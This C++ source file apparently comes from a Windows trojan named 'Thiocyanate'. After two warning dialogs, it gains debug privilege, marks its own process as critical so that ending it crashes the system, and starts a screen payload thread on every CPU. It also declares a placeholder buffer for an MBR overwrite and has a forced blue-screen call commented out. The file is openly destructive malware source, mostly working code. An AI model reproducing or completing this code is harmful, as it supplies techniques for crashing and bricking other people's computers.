#include "payloads.hpp"

const BYTE mbr[] = {
	// todo: bytecode goes here
	0x00,
};

typedef void (*funcarray)(PAYLOADPARAMS p);

typedef NTSTATUS(NTAPI* fnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(NTAPI* fnNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR* Parameters, ULONG ValidResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* fnNtSetInformationProcess)(HANDLE hProcess, ULONG ulClassInfo, PVOID pProcessInformation, ULONG pProcessInformationSize);

funcarray funcs[] = {
	p1,
};

vector<HANDLE> handles;

INT WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
	if (MessageBox(NULL, "You have just run a trojan known as Thiocyanate. This trojan has the capability to corrupt your personal data as well as bricking your system. If you wish to continue, press OK. If you wish to exit, press Cancel.", "Thiocyanate", MB_OKCANCEL | MB_ICONINFORMATION) == IDCANCEL) {
		return 0;
	}
	
	if (MessageBox(NULL, "THIS IS A FINAL WARNING. DO NOT PRESS OK IF YOU DO NOT WISH TO CONTINUE. DOING SO WILL BRICK YOUR SYSTEM. DO YOU WISH TO CONTINUE?", "FINAL WARNING", MB_OKCANCEL | MB_ICONERROR) == IDCANCEL) {
		return 0;
	}

	HDC hdc = GetDC(NULL);
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	SYSTEM_INFO sysinfo;
	GetSystemInfo(&sysinfo);
	int numprocs = sysinfo.dwNumberOfProcessors;

	handles.reserve(numprocs);

	HMODULE ntdll = LoadLibraryA("ntdll.dll");
	if (ntdll == NULL) {
		MessageBox(NULL, "Failed to load ntdll.dll; exiting", "Error", MB_OK | MB_ICONERROR);
		return 0;
	}
	fnRtlAdjustPrivilege RtlAdjustPrivilege = (fnRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
	fnNtRaiseHardError NtRaiseHardError = (fnNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
	fnNtSetInformationProcess NtSetInformationProcess = (fnNtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");

	BOOLEAN bOld1;
	ULONG ulBreakOnTermination1 = 1;
	RtlAdjustPrivilege(20, TRUE, FALSE, &bOld1);
	NtSetInformationProcess(GetCurrentProcess(), 0x1D, &ulBreakOnTermination1, sizeof(ULONG));
	
	PAYLOADPARAMS params = { 0 };
	params.hdc = hdc;
	params.x = x;
	params.y = y;

	for (int i = 0; i < numprocs; i++) {
		HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)funcs[0], &params, 0, NULL);
		handles.push_back(h);
	}
	
	// cleanup
	for (int i = 0; i < handles.size(); i++) {
		WaitForSingleObject(handles[i], INFINITE);
		CloseHandle(handles[i]);
	}
	
	ReleaseDC(NULL, hdc);
	
	BOOLEAN bOld2;
	ULONG ulResponse;/*
	RtlAdjustPrivilege(19, TRUE, FALSE, &bOld2);
	NtRaiseHardError(0xDEADDEAD, NULL, NULL, NULL, 6, &ulResponse);*/
	FreeLibrary(ntdll);
	
	return 0;
}